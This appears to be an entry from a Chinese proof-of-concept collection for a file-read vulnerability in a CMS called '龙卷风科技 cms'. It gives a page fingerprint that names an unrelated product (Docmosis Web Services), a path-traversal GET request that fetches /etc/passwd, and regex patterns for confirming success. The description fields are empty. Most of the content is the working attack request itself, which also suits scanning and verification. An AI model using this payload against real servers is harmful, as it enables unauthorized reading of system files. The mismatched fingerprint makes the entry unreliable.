﻿# 龙卷风科技 cms  文件读取漏洞

> 更新时间：2024-04-30

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="Welcome to Docmosis Web Services"

> 验证脚本：HTTP

```
GET /api/../fetch?filename=/../../../../../etc/passwd HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：龙卷风科技 cms  文件读取漏洞.poc

